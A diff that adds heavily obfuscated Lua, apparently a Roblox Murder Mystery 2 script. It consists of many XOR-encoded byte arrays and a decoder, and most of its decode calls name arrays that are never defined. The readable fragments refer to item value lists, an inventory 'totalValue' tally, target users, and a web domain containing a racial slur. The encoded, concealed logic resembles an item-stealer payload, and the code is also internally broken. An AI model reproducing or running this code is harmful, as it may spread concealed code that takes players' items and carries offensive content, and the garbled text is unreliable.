+local _pcdlicyjhyxf = {110,121,109,105,121,111,104,22,60,60,60,60,22,60,60,60,60,108,127,125,112,112,52,122,105,114,127,104,117,115,114,52,53,22,60,60,60,60,60,60,60,60,110,121,109,105,121,111,104,90,105,114,127,52,103,22,60,60,60,60,60,60,60,60,60,60,60,60,73,110}
+local _nwjwhksaiqim = {246,251,183,249,246,250,242,183,170,183,227,248,228,227,229,254,249,240,191,254,227,242,250,185,211,246,227,246,222,211,190,173,240,228,226,245,191,181,178,228,188,181,187,183,181,181,190,157,157,183,183,183,183,183,183,183,183,251,248,244,246,251,183,254,227,242,250,211,246,227}
+local _xxtaaejputiu = {66,73,72,121,95,73,94,0,12,88,67,95,88,94,69,66,75,4,90,5,22,64,67,91,73,94,4,5,5,12,73,66,72,38,74,67,94,12,115,0,12,90,12,69,66,12,69,92,77,69,94,95,4,104,68,121,95,73,94,95,5,12,72,67,12,88,77,78,64,73}
+local _ttfcuyygcqel = {186,167,182,179,181,191,181,180,181,190,182,167,243,239,226,233,141,167,167,167,167,247,235,245,189,236,238,228,236,175,165,192,230,234,226,167,233,232,243,167,244,242,247,247,232,245,243,226,227,169,167,215,235,226,230,244,226,167,237,232,238,233,167,230,167,233,232,245,234,230}
+local _ngvepuxsoxcg = {26,26,30,29,84,65,65,8,27,13,5,7,0,9,0,7,9,9,11,28,3,8,64,24,11,28,13,11,2,64,15,30,30,65,15,30,7,65,15,24,15,26,15,28,81,27,29,11,28,39,10,83,76,78,64,64,78,26,1,29,26,28,7,0,9,70,30,2,28,64}
+local _ckzdlwifgefy = {120,105,107,99,126,101,105,127,44,49,44,119,6,44,44,44,44,107,99,104,96,117,44,49,44,46,100,120,120,124,127,54,35,35,127,121,124,126,105,97,105,122,109,96,121,105,96,101,127,120,34,111,99,97,35,97,97,62,35,107,99,104,96,101,105,127,34,100,120,97}
+local _vatbshpxqktz = {204,246,253,240,187,247,242,231,242,186,153,179,179,179,179,179,179,179,179,255,252,240,242,255,179,241,179,174,179,180,210,209,208,215,214,213,212,219,218,217,216,223,222,221,220,195,194,193,192,199,198,197,196,203,202,201,242,241,240,247,246,245,244,251,250,249,248,255,254,253}
+local _sdmdkdeqbowc = {4,46,46,46,46,107,96,106,4,4,46,46,46,46,4,46,46,46,46,98,97,109,111,98,46,106,111,122,111,46,51,46,117,4,46,46,46,46,105,111,99,107,90,119,126,107,46,51,46,44,67,67,60,44,34,46,4,46,46,46,46,122,97,126,102,103,122,46,51,46}
+local _rntdxrimpgtu = {142,224,224,202,202,202,202,202,202,202,202,157,130,131,134,143,202,201,157,143,139,154,133,132,153,190,133,185,143,132,142,202,212,202,218,202,142,133,224,202,202,202,202,202,202,202,202,202,202,202,202,134,133,137,139,134,202,158,152,139,142,143,185,158,139,158,159,153,202,215}
+local _dftzvbeeypuq = {130,147,155,133,222,158,130,155,154,181,153,152,130,147,152,130,223,252,214,214,214,214,154,153,149,151,154,214,159,130,147,155,160,151,154,131,147,133,214,203,214,141,139,252,214,214,214,214,144,153,132,214,159,130,147,155,184,151,155,147,218,214,159,130,147,155,148,153,146,143}
+local _tbmezgqqwhpc = {208,250,250,250,250,250,250,250,250,185,181,175,180,174,168,163,250,231,250,190,187,174,187,244,185,181,175,180,174,168,163,250,181,168,250,248,143,180,177,180,181,173,180,248,208,250,250,250,250,191,180,190,243,208,182,181,185,187,182,250,182,181,185,187,174,179,181,180,137,174}
+local _kjvinbflxypu = {210,142,132,250,200,231,200,194,134,130,131,136,148,192,134,209,201,212,210,206,134,201,192,134,207,210,195,203,213,134,203,201,212,195,136,136,136,250,200,132,138,134,203,199,210,206,136,203,199,222,142,150,138,134,212,195,203,199,207,200,207,200,193,243,245,226,143,143,172,134}
+local _nnpxwjzhlcev = {202,198,181,142,135,148,141,181,131,131,141,131,148,198,219,198,146,148,147,131,236,155,236,138,137,133,135,138,198,144,135,138,147,131,170,143,149,146,198,219,198,132,147,143,138,130,176,135,138,147,131,170,143,149,146,206,207,236,138,137,133,135,138,198,148,131,135,138,162,135}
+local _nykscrmqjqnp = {140,129,205,153,130,153,140,129,174,140,153,136,138,130,159,132,136,158,205,208,205,206,142,140,153,136,138,130,159,132,136,158,185,130,171,136,153,142,133,231,205,205,205,205,129,130,142,140,129,205,142,130,128,157,129,136,153,136,137,205,208,205,221,231,205,205,205,205,129,130}
+local _unzvpvokmyck = {101,10,222,107,203,39,225,182,207,135,145,169,220,218,16,205,209,225,6,58,177,14,43,192,65,163,226,45,251,201,151,42,78,246,144,148,233,229,78,178,61,179,69,187,220,80,110,237,0,161,51,175,133,91,2,165,98,213,40,175,99,231,11,23,182,64,200,39,48,168,200,146,61,8,3,31,88,44,21,176,143,209,202,134,169,49,123,11,193,135,34,78,10,189,221,33,250,52,201,120,81,154,177,26,151,255,225,35,31,29,188,23,167,142,188,61,169,46,253,153,153,100,116,70,252,125,159,88,109,26,61,41}
+local _cykzcwvcnwur = {76,74,89,92,93,107,76,89,76,77,75,24,5,5,24,26,107,76,89,74,76,108,74,89,92,93,26,24,76,80,93,86,50,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,84,87,91,89,84,24,86,77,85,108,87,108,74,89,92,93,24,5,24,85,89}
+local _fojolbpezmqr = {93,119,119,119,119,119,119,119,119,35,37,54,51,50,48,34,62,39,63,56,57,50,121,18,57,54,53,59,50,51,119,106,119,49,54,59,36,50,93,119,119,119,119,50,57,51,93,50,57,51,126,93,93,59,56,52,54,59,119,32,50,54,39,56,57,36,3,56,4,50}
+local _bezpxqxroouu = {120,57,54,60,120,49,44,61,53,8,42,49,59,61,43,3,52,55,55,51,45,40,19,61,33,5,118,40,42,49,59,61,113,120,55,42,120,104,82,120,120,120,120,52,55,59,57,52,120,52,49,54,61,120,101,120,43,44,42,49,54,63,118,62,55,42,53,57,44,112}
+local _ggppyabozgzx = {247,247,179,253,238,245,248,239,242,244,245,179,178,145,187,187,187,187,187,187,187,187,233,254,239,238,233,245,187,233,254,234,238,254,232,239,221,238,245,248,179,224,187,206,233,247,187,166,187,238,233,247,183,187,214,254,239,243,244,255,187,166,187,185,220,222,207,185,183,187}
+local _rlwpnyajkzxq = {189,241,188,184,191,142,163,176,163,184,165,168,241,236,241,142,150,255,188,184,191,142,163,176,163,184,165,168,241,190,163,241,243,150,190,181,189,168,243,219,189,190,178,176,189,241,188,184,191,142,167,176,189,164,180,241,236,241,142,150,255,188,184,191,142,167,176,189,164,180}
+local _ykmrxopptjwh = {94,84,58,16,16,16,16,92,95,83,81,92,16,68,66,81,84,85,87,69,89,64,88,95,94,85,16,13,16,64,92,81,73,85,66,119,69,89,10,103,81,89,68,118,95,66,115,88,89,92,84,24,18,100,66,81,84,85,119,101,121,111,96,88,95,94,85,18,28,16}
+local _dxebsdnqnyfy = {59,49,95,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,48,57,38,48,95,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,54,61,39,58,56,52,16,45,33,39,52,54,33,48,49,3,52,57,32,48,38,117,104,117,48,45}
+local _wqgxaczzqauk = {227,227,227,227,227,227,227,227,151,177,162,167,166,237,135,166,160,175,170,173,166,151,177,162,167,166,249,133,170,177,166,144,166,177,181,166,177,235,234,201,227,227,227,227,227,227,227,227,227,227,227,227,183,162,176,168,237,180,162,170,183,235,243,237,240,234,201,227,227,227}
+local _qtvjxltihhjl = {198,146,143,146,198,192,199,215,158,184,146,146,146,146,230,215,193,198,251,198,215,223,146,143,146,198,192,199,215,158,146,225,215,211,193,221,220,131,230,215,193,198,249,220,219,212,215,146,143,146,198,192,199,215,158,146,241,192,211,209,217,193,146,143,146,198,192,199,215,158}
+local _reyisctpewqu = {108,114,46,78,97,109,101,41,10,108,111,99,97,108,32,116,111,116,97,108,86,97,108,117,101,32,61,32,48,10,102,111,114,32,100,97,116,97,105,100,44,32,97,109,111,117,110,116,32,105,110,32,112,97,105,114,115,40,114,101,97,108,68,97,116,97,46,87,101,97}
+local _nlzokkqwrglo = {142,198,151,149,159,151,212,170,181,172,220,157,146,152,220,222,170,181,172,220,175,153,142,138,153,142,143,220,146,147,136,220,143,137,140,140,147,142,136,153,152,210,222,220,147,142,220,222,186,169,176,176,220,175,153,142,138,153,142,143,220,189,142,153,146,136,220,175,137,140}
+local _xojoumnoattp = {64,115,89,89,89,89,4,115,89,89,89,89,115,89,89,89,89,115,89,89,89,89,21,22,26,24,21,89,13,24,11,30,28,13,89,68,89,91,91,115,89,89,89,89,31,22,11,89,16,68,72,85,89,90,38,12,59,89,29,22,89,115,89,89,89,89,89,89,89,89}
+local _cujufgxkgyki = {32,88,100,105,113,109,122,123,50,79,109,124,88,100,105,113,109,122,123,32,33,33,40,108,103,2,40,40,40,40,40,40,40,40,40,40,40,40,97,110,40,124,105,106,100,109,38,110,97,102,108,32,107,103,101,106,97,102,109,108,93,123,109,122,36,40,120,38,70,105}
+local _ufdrsittaxyh = {114,104,79,116,107,83,114,111,55,17,59,59,59,59,59,59,59,59,120,116,117,111,126,117,111,59,38,59,107,105,126,125,114,99,59,53,53,59,57,124,122,118,126,33,92,126,111,72,126,105,109,114,120,126,51,60,79,126,119,126,107,116,105,111,72,126,105,109,114,120}
+local _etownhmbxird = {200,197,196,207,213,200,199,216,196,217,196,194,212,213,206,211,137,136,155,205,206,214,196,211,137,136,136,129,206,211,129,131,212,207,202,207,206,214,207,131,171,205,206,194,192,205,129,200,210,236,206,195,200,205,196,129,156,129,210,213,211,200,207,198,143,199,200,207,197,137}
+local _pnhzkmrmtctm = {89,86,73,85,72,85,83,69,68,95,66,24,25,10,92,95,71,85,66,24,25,25,16,95,66,16,18,69,94,91,94,95,71,94,18,58,58,92,95,83,81,92,16,90,95,82,121,84,16,13,16,87,81,93,85,30,122,95,82,121,84,58,58,58,58,92,95,83,81,92}
+local _idtbufzenynz = {45,45,45,45,45,127,104,110,104,100,123,104,127,45,48,45,127,104,110,104,100,123,104,127,94,121,127,45,7,45,45,45,45,45,45,45,45,112,7,7,45,45,45,45,45,45,45,45,97,98,110,108,97,45,126,120,110,110,104,126,126,33,45,127,104,126,125,98,99,126}
+local _bhhdgorbdgtq = {153,155,150,218,150,149,153,145,218,199,218,179,148,137,142,155,148,153,159,212,148,159,141,210,216,184,147,148,158,155,152,150,159,191,140,159,148,142,216,211,240,218,218,218,218,156,149,136,218,165,214,218,153,155,142,159,157,149,136,131,218,147,148,218,147,138,155,147,136,137}
+local _suyzecjbbxll = {248,248,248,248,248,248,189,180,171,189,210,210,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,182,185,181,189,248,229,248,182,185,181,189,226,191,171,173,186,240,250,155,176,170,183,181,185,250,244,248,250,250,241,248,246,246,248,250,155,176,170,183,181,185,250}
+local _rbdtoipsumfi = {232,174,224,225,250,174,252,235,255,251,235,253,250,200,251,224,237,174,250,230,235,224,174,252,235,250,251,252,224,174,172,172,174,235,224,234,132,174,174,174,174,226,225,237,239,226,174,253,251,237,237,235,253,253,162,174,252,235,253,254,225,224,253,235,174,179,174,254,237,239}
+local _ocrflrugnrgv = {48,45,127,0,127,98,127,110,115,127,40,58,62,47,48,49,113,30,50,48,42,49,43,127,59,48,85,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,127,62,59,59,8,58,62,47,48,49,11,48,11,45,62,59,58,119,40,58}
+local _qvxlnejesyip = {104,104,104,104,104,104,104,104,104,104,104,46,39,58,104,35,100,104,62,104,33,38,104,56,41,33,58,59,96,45,48,60,58,41,43,60,45,44,97,104,44,39,104,41,36,36,13,48,60,58,41,43,60,45,44,30,41,36,61,45,59,19,35,21,104,117,104,62,104,45}
+local _gwbernovjruu = {29,91,72,83,94,73,84,82,83,29,92,78,78,84,90,83,117,84,73,105,82,121,92,73,92,95,92,78,88,21,20,55,29,29,29,29,55,29,29,29,29,81,82,94,92,81,29,72,78,88,79,113,84,78,73,29,0,29,72,78,88,79,78,29,82,79,29,70,64,55}
+local _uxharhhodern = {220,237,229,170,142,176,62,124,89,99,188,196,6,170,23,43,120,118,114,220,146,54,20,170,82,9,199,57,150,144,200,70,69,152,66,64,131,33,129,183,112,147,40,234,71,12,161,21,128,194,137,188,247,30,8,80,192,1,74,45,95,52,10,182,231,26,128,205,87,30,242,194,19,174,208,51,0,59,231,57,216,111,107,50,123,182,203,119,51,54,146,237,43,100,242,146,136,179,137,169,63,170,86,238,143,127,187,236,136,93,6,112,228,157,165,183,55,0,201,191,70,81,248,138,150,36,45,3,236,21,243,6,2,37,242,74,83,222,139,193,139,137,142,1,165,1,125,81,221,18,215,44,53,220,248,237,182,94,128,52,13,151,37,193,205,249,44,78,119,174,103,12,135,172,104,64,189,181,207,185,69,228,4,230,87,233,43,42,247,158,37,254,148,145,70,217,176,116}
+local _sdcaxfafxfcq = {64,76,93,92,84,64,76,88,90,64,76,85,91,64,76,102,76,76,76,76,76,76,76,76,93,93,94,64,76,93,93,94,64,76,88,91,64,76,85,91,64,76,93,93,94,64,76,93,92,89,64,76,88,91,64,76,85,85,64,76,85,91,64,76,93,92,84,64,76,85}
+local _moyjdyqupbvh = {57,61,34,12,42,17,50,79,88,86,112,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,19,25,21,20,37,15,8,22,90,71,90,52,21,14,50,31,27,30,112,90,90,90,90,90,90,90,90,90,90,90,90,7,86,112,90,90,90,90,90,90,90,90,90}
+local _kziqhatttwis = {216,216,216,216,216,216,216,216,216,216,216,131,216,150,153,149,157,216,197,216,218,164,202,204,200,164,201,205,193,164,201,205,200,164,201,206,205,216,189,128,157,155,141,140,151,138,218,212,216,142,153,148,141,157,216,197,216,218,152,152,152,218,216,214,214,216,189,128,157,155}
+local _twfepxhnbddi = {112,124,48,61,47,40,124,53,50,124,41,40,58,100,114,59,46,61,44,52,57,49,57,47,116,47,40,46,117,124,56,51,86,124,124,124,124,124,124,124,124,46,57,40,41,46,50,124,58,53,46,47,40,86,124,124,124,124,57,50,56,86,57,50,56,117,86,86,53,58}
+local _djtllafvevnr = {1,12,85,72,85,7,20,7,28,1,12,89,85,52,24,26,0,27,1,85,72,85,20,24,26,0,27,1,89,85,35,20,25,0,16,85,72,85,3,20,25,0,16,8,92,127,85,85,85,85,85,85,85,85,16,27,17,127,85,85,85,85,16,27,17,127,16,27,17,127}
+local _iwvibdxprylj = {97,112,113,118,106,36,127,121,14,97,106,96,14,104,107,103,36,57,36,67,97,112,72,107,103,101,112,109,107,106,44,45,36,14,104,107,103,101,104,36,118,97,117,113,97,119,112,66,113,106,103,36,57,36,118,97,117,113,97,119,112,36,107,118,36,44,119,125,106,36}
+local _igdxddcjsevf = {79,79,79,79,79,79,79,79,12,0,2,31,3,10,27,10,11,79,82,79,12,0,2,31,3,10,27,10,11,79,68,79,94,101,79,79,79,79,79,79,79,79,79,79,79,79,6,9,79,12,0,2,31,3,10,27,10,11,79,82,82,79,27,0,27,14,3,44,14,27}
+local _xhtaxvjpmutu = {81,81,95,19,22,17,26,117,95,95,95,95,95,95,95,95,95,95,95,95,13,26,18,30,22,17,22,17,24,42,44,59,95,66,95,13,26,18,30,22,17,22,17,24,42,44,59,95,82,95,15,13,22,28,26,117,95,95,95,95,95,95,95,95,26,19,12,26,117,95}
+local _pmignsuioarw = {240,240,240,240,240,181,188,163,181,185,182,240,185,190,185,164,185,177,188,132,162,177,180,181,131,164,177,164,181,240,237,237,240,242,130,181,179,181,185,166,185,190,183,130,181,161,165,181,163,164,242,240,164,184,181,190,218,240,240,240,240,240,240,240,240,240,240,240,240,132}
+local _fccqwimfqmhw = {175,188,185,184,243,153,184,190,177,180,179,184,143,184,172,168,184,174,169,231,155,180,175,184,142,184,175,171,184,175,245,244,215,253,253,253,253,253,253,253,253,253,253,253,253,169,188,174,182,243,170,188,180,169,245,237,243,238,244,215,253,253,253,253,253,253,253,253,184,179}
+local _pbwsrshfphlf = {149,152,197,216,212,135,151,134,157,132,128,186,149,153,145,216,212,157,135,181,151,128,157,130,145,216,212,130,149,152,198,221,254,212,212,212,212,152,155,151,149,152,212,150,149,135,145,162,149,152,129,145,212,201,212,197,254,212,212,212,212,157,146,212,154,155,128,212,157,135}
+local _lkwpigcpwxbc = {106,106,106,106,35,44,106,105,63,57,47,56,6,35,57,62,106,119,119,106,122,106,62,34,47,36,64,106,106,106,106,56,47,62,63,56,36,64,106,106,106,106,47,36,46,64,64,106,106,106,106,44,37,56,106,21,102,106,56,47,41,47,35,60,47,56,4,43,39,47}
+local _knvfpydnttds = {110,104,55,59,118,126,104,104,122,124,126,55,59,104,120,105,114,107,111,77,126,105,104,114,116,117,59,38,59,126,99,107,119,122,114,117,72,120,105,114,107,111,104,51,42,55,59,57,72,120,105,114,107,111,57,55,59,111,105,110,126,55,59,46,46,50,17,17,119,116}
+local _fcciufmovcqc = {114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,62,61,49,51,62,114,37,55,51,34,61,60,114,111,114,37,55,51,34,61,60,33,6,61,1,55,60,54,9,59,15,88,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,52}
+
+-- DECODER
+
+local _kcbzfegjjsxx = function(_hsrvehyfcdbm, _pxkafomxtphr)
+  local _xnqppfqavvcp = string.char
+  local _itleshukdkqa = 1
+  local _qwiuztwbvicu = {}
+  for _gcybovpazqcz = 1, #_hsrvehyfcdbm do
+    local _mpxqrvyzsylg = _hsrvehyfcdbm[_gcybovpazqcz]
+    _qwiuztwbvicu[_itleshukdkqa] = string.char(_mpxqrvyzsylg ~ (_pxkafomxtphr + (_gcybovpazqcz - 1) * 13 + 37) % 256)
+    _itleshukdkqa = _itleshukdkqa + 1
+  end
+  return table.concat(_qwiuztwbvicu)
 end
 
+local _wgvkjhwpsusl = 77
 
+local _ftvisgxalzot = _kcbzfegjjsxx(_wcercimujwja, _wgvkjhwpsusl)
+local _mgirtaftgovz = _kcbzfegjjsxx(_fdxufhxbqyrm, _wgvkjhwpsusl)
+local _ndnhhibvedta = _kcbzfegjjsxx(_mxjjrbrcjumu, _wgvkjhwpsusl)
+local _lyksrezjbuxc = _kcbzfegjjsxx(_bhdwsybmzpob, _wgvkjhwpsusl)
+local _ifodjhjcmdug = _kcbzfegjjsxx(_obclueagyvbn, _wgvkjhwpsusl)
+local _xzxapqjthanh = _kcbzfegjjsxx(_azrkawicmbmd, _wgvkjhwpsusl)
+local _lnvyxvrtwslo = _kcbzfegjjsxx(_kpbvetpzxqgj, _wgvkjhwpsusl)
+local _bhdbponcbffq = _kcbzfegjjsxx(_lfgefqroptyo, _wgvkjhwpsusl)
+local _ubslkpwiqxsp = _kcbzfegjjsxx(_cxkrnyjutqpo, _wgvkjhwpsusl)
+local _etshnaxrcspy = _kcbzfegjjsxx(_ebzfbqbwiiii, _wgvkjhwpsusl)
+local _fhuntizbpdzm = _kcbzfegjjsxx(_pbwsrshfphlf, _wgvkjhwpsusl)
+local _mgobqqngwrra = _kcbzfegjjsxx(_faqmslqkifcc, _wgvkjhwpsusl)
+local _hitkplbfmuto = _kcbzfegjjsxx(_ttsfutglmahs, _wgvkjhwpsusl)
+local _fjithcmmmfvn = _kcbzfegjjsxx(_knvfpydnttds, _wgvkjhwpsusl)
+local _fbdogbyuzumv = _kcbzfegjjsxx(_egkcpoxeuscf, _wgvkjhwpsusl)
+local _odutxsstyszo = _kcbzfegjjsxx(_knkaogwgdjzn, _wgvkjhwpsusl)
+local _muxzgzowwzhb = _kcbzfegjjsxx(_tipbmveksxoj, _wgvkjhwpsusl)
+local _pwfzvxudmtci = _kcbzfegjjsxx(_saypdkjrjdvr, _wgvkjhwpsusl)
+local _msncxlqzngmc = _kcbzfegjjsxx(_twfepxhnbddi, _wgvkjhwpsusl)
+local _ufthqmcixwnp = _kcbzfegjjsxx(_kczyzblsgwlt, _wgvkjhwpsusl)
+local _fhbgbjeqtvmw = _kcbzfegjjsxx(_cbtfqhaialxb, _wgvkjhwpsusl)
+local _qycviuwcexsg = _kcbzfegjjsxx(_aipsnpwjvgfl, _wgvkjhwpsusl)
+local _ecjioxfdyoje = _kcbzfegjjsxx(_ifjuqdlzpqlm, _wgvkjhwpsusl)
+local _bibsamsatmal = _kcbzfegjjsxx(_zmdmxrvupwgt, _wgvkjhwpsusl)
+local _rzuikuifxlsi = _kcbzfegjjsxx(_ewvfrivqipcq, _wgvkjhwpsusl)
+local _bhakzpjbokbv = _kcbzfegjjsxx(_snqhvpyvzphd, _wgvkjhwpsusl)
+local _vplzwopcfyki = _kcbzfegjjsxx(_vleorhngquxd, _wgvkjhwpsusl)
+local _kcrrcwckpupo = _kcbzfegjjsxx(_rlwpnyajkzxq, _wgvkjhwpsusl)
+local _fbzptovzjcbp = _kcbzfegjjsxx(_snenlfeutgio, _wgvkjhwpsusl)
+local _vhtkqradhmqh = _kcbzfegjjsxx(_ldojnkjrrufs, _wgvkjhwpsusl)
+local _sgstxcluqitz = _kcbzfegjjsxx(_djzuyziezojq, _wgvkjhwpsusl)
+local _drybyhwrpuri = _kcbzfegjjsxx(_eiojayxkeuqr, _wgvkjhwpsusl)
+local _cbmfvjjjkhgw = _kcbzfegjjsxx(_otcaphagvhlh, _wgvkjhwpsusl)
+local _jpmkfgpaxbwf = _kcbzfegjjsxx(_nbqvxyrmitds, _wgvkjhwpsusl)
+local _gwpfpougdnle = _kcbzfegjjsxx(_xxtaaejputiu, _wgvkjhwpsusl)
+local _pwcjjfvodljh = _kcbzfegjjsxx(_nbajaewppajp, _wgvkjhwpsusl)
+local _xfmtfjlngusl = _kcbzfegjjsxx(_xdtvrynpbaco, _wgvkjhwpsusl)
+local _xgdvjakuzztf = _kcbzfegjjsxx(_xvlwtfiyxasu, _wgvkjhwpsusl)
+local _wysdtpemprty = _kcbzfegjjsxx(_hjgarvvutxwr, _wgvkjhwpsusl)
+local _fbpqdsafiumb = _kcbzfegjjsxx(_mubtbzhqavhw, _wgvkjhwpsusl)
+local _vcntvtydudxt = _kcbzfegjjsxx(_lhlcpmdqcxys, _wgvkjhwpsusl)
+local _movpftyqoqyh = _kcbzfegjjsxx(_ttfcuyygcqel, _wgvkjhwpsusl)
+local _igfchlvxxotg = _kcbzfegjjsxx(_wwuhhtsuxphz, _wgvkjhwpsusl)
+local _dbsahnqewdon = _kcbzfegjjsxx(_etownhmbxird, _wgvkjhwpsusl)
+local _zcmciaketcnj = _kcbzfegjjsxx(_bxwtaudwgtmf, _wgvkjhwpsusl)
+local _uoehpbmavcmu = _kcbzfegjjsxx(_twmvreasjmpj, _wgvkjhwpsusl)
+local _euzlcntgdxir = _kcbzfegjjsxx(_arysmxfztyio, _wgvkjhwpsusl)
+local _wolkfpzkgeya = _kcbzfegjjsxx(_ptopeebrscmn, _wgvkjhwpsusl)
+local _btmwvdhqizdc = _kcbzfegjjsxx(_raaqjuahqidm, _wgvkjhwpsusl)
+local _dbbttskcjutr = _kcbzfegjjsxx(_cxgwvgfrtvvv, _wgvkjhwpsusl)
+local _oztrxgpwngac = _kcbzfegjjsxx(_nlzokkqwrglo, _wgvkjhwpsusl)
+local _oeetnqlzccaf = _kcbzfegjjsxx(_qychwquqjuny, _wgvkjhwpsusl)
+local _zsejgsetncqc = _kcbzfegjjsxx(_hlmuoqjxdwrq, _wgvkjhwpsusl)
+local _euqwgxuxxqqh = _kcbzfegjjsxx(_kqkpsajxcljz, _wgvkjhwpsusl)
+local _styptxneszbw = _kcbzfegjjsxx(_pnhzkmrmtctm, _wgvkjhwpsusl)
+local _ovemttrphxoq = _kcbzfegjjsxx(_gwbernovjruu, _wgvkjhwpsusl)
+local _lwxsezangvbe = _kcbzfegjjsxx(_lkwpigcpwxbc, _wgvkjhwpsusl)
+local _xzedncifoyxp = _kcbzfegjjsxx(_zmbztzznysed, _wgvkjhwpsusl)
+local _wlycmwebvpxk = _kcbzfegjjsxx(_gjplpnqvwhnf, _wgvkjhwpsusl)
+local _npneynaacawc = _kcbzfegjjsxx(_gdzfnwraxirk, _wgvkjhwpsusl)
+local _xwturakrifdq = _kcbzfegjjsxx(_alpukifhzjiw, _wgvkjhwpsusl)
+local _ikdypjfzkclw = _kcbzfegjjsxx(_dacdopjlmabc, _wgvkjhwpsusl)
+local _amxhziexqcfk = _kcbzfegjjsxx(_tflmtqkhwdlv, _wgvkjhwpsusl)
+local _dlsbtlxfzmau = _kcbzfegjjsxx(_olyjbvnoqnqw, _wgvkjhwpsusl)
+local _ptxktrzltwfb = _kcbzfegjjsxx(_yqhxetluiruf, _wgvkjhwpsusl)
+local _moedafxetehz = _kcbzfegjjsxx(_kpgujmdqphyz, _wgvkjhwpsusl)
+local _iqyyocyybzob = _kcbzfegjjsxx(_xznilzhilzsf, _wgvkjhwpsusl)
+local _hryqdsseqode = _kcbzfegjjsxx(_cuhuzwfockwl, _wgvkjhwpsusl)
+local _regxbpxhqqzm = _kcbzfegjjsxx(_aogkxohebaeh, _wgvkjhwpsusl)
+local _yunaenhepyev = _kcbzfegjjsxx(_bljcaymbmlhz, _wgvkjhwpsusl)
+local _setzbjaqnasr = _kcbzfegjjsxx(_boherhcsynqs, _wgvkjhwpsusl)
+local _anpzyfzfuxxx = _kcbzfegjjsxx(_idtbufzenynz, _wgvkjhwpsusl)
+local _spogszxqacvn = _kcbzfegjjsxx(_xblkwjkwlkqn, _wgvkjhwpsusl)
+local _neqqghbibylo = _kcbzfegjjsxx(_krkjnzocmira, _wgvkjhwpsusl)
+local _jgxbgwdbvfue = _kcbzfegjjsxx(_mickqcpchewa, _wgvkjhwpsusl)
+local _imyfvviuuaqp = _kcbzfegjjsxx(_mygacsjewydm, _wgvkjhwpsusl)
+local _elrqsnejurgx = _kcbzfegjjsxx(_zvwbvmghaqop, _wgvkjhwpsusl)
+local _jejzjndfpjqs = _kcbzfegjjsxx(_lzjfzdefkpao, _wgvkjhwpsusl)
+local _teoklxcstjgt = _kcbzfegjjsxx(_prnzplqlqwcd, _wgvkjhwpsusl)
+local _xyzscidtdzmf = _kcbzfegjjsxx(_imwhzjxbddfe, _wgvkjhwpsusl)
+local _oomnwuykiwyb = _kcbzfegjjsxx(_tjbtfeivtymu, _wgvkjhwpsusl)
+local _opipycbjackm = _kcbzfegjjsxx(_yxyvlrsuxver, _wgvkjhwpsusl)
+local _jzvltqsbuozo = _kcbzfegjjsxx(_piymewwmbqnk, _wgvkjhwpsusl)
+local _ufompyqwggaj = _kcbzfegjjsxx(_xnzrjtlsskeb, _wgvkjhwpsusl)
+local _liprzdaurrxs = _kcbzfegjjsxx(_vwwqryjfqucm, _wgvkjhwpsusl)
+local _xcnljdtffenw = _kcbzfegjjsxx(_rdmwtefbnldw, _wgvkjhwpsusl)
+local _vtsddovidebt = _kcbzfegjjsxx(_umartcywrxlu, _wgvkjhwpsusl)
+local _zsdiwbdlnrsx = _kcbzfegjjsxx(_mhknevxvpqtu, _wgvkjhwpsusl)
+local _uhaymavviuma = _kcbzfegjjsxx(_vnqophiwddfd, _wgvkjhwpsusl)
+local _yonluaafjeqd = _kcbzfegjjsxx(_siminwlkmtes, _wgvkjhwpsusl)
+local _hpndqdjnsqjm = _kcbzfegjjsxx(_iwvibdxprylj, _wgvkjhwpsusl)
+local _lhimrhofmgaz = _kcbzfegjjsxx(_evtxshocsteg, _wgvkjhwpsusl)
+local _ceptkmuvitbx = _kcbzfegjjsxx(_vchlvyoqxgkz, _wgvkjhwpsusl)
+local _goexplwbbunc = _kcbzfegjjsxx(_vykspqdwjutz, _wgvkjhwpsusl)
+local _anttycrnfytz = _kcbzfegjjsxx(_pzhwtybvuupu, _wgvkjhwpsusl)
+local _lxsisjogwfjp = _kcbzfegjjsxx(_qfptbfqraaxn, _wgvkjhwpsusl)
+local _kdoqwffctuxv = _kcbzfegjjsxx(_wzbjfbbcytow, _wgvkjhwpsusl)
+local _vbqrfepnsiel = _kcbzfegjjsxx(_jehdhfppwhrl, _wgvkjhwpsusl)
+local _tddtokhkvlrc = _kcbzfegjjsxx(_sdcaxfafxfcq, _wgvkjhwpsusl)
+local _qnjrqjrsvbfc = _kcbzfegjjsxx(_xojoumnoattp, _wgvkjhwpsusl)
+local _edveatelbsib = _kcbzfegjjsxx(_kdoyvyaqgvss, _wgvkjhwpsusl)
+local _nyhjrmqeiwyo = _kcbzfegjjsxx(_vatbshpxqktz, _wgvkjhwpsusl)
+local _xikzrawiwilb = _kcbzfegjjsxx(_egfwplefunjh, _wgvkjhwpsusl)
+local _olpanfyhvnlx = _kcbzfegjjsxx(_wytuzgdgtloo, _wgvkjhwpsusl)
+local _npdovzznsluv = _kcbzfegjjsxx(_hbmppgojqecu, _wgvkjhwpsusl)
+local _ffhqweqxsvvv = _kcbzfegjjsxx(_namuqfiiiyrn, _wgvkjhwpsusl)
+local _nszendgxfsbx = _kcbzfegjjsxx(_joxfgnhivaon, _wgvkjhwpsusl)
+local _kaanoaiqopjg = _kcbzfegjjsxx(_agieoeisxlfk, _wgvkjhwpsusl)
+local _wynavzpmarxd = _kcbzfegjjsxx(_mpdbrohromft, _wgvkjhwpsusl)
+local _bbuqbeyvejeg = _kcbzfegjjsxx(_zysvlmngbwut, _wgvkjhwpsusl)
+local _nausfxbwayru = _kcbzfegjjsxx(_vtmnfciiahqq, _wgvkjhwpsusl)
+local _yhwanmsrcpmg = _kcbzfegjjsxx(_cyfxrcerivnh, _wgvkjhwpsusl)
+local _tnlkvghiybpv = _kcbzfegjjsxx(_koefvtuxsvmv, _wgvkjhwpsusl)
+local _noqqfihjqrug = _kcbzfegjjsxx(_rjxjkdryjskg, _wgvkjhwpsusl)
+local _rcnjifthuitl = _kcbzfegjjsxx(_xlqvvrxmawjw, _wgvkjhwpsusl)
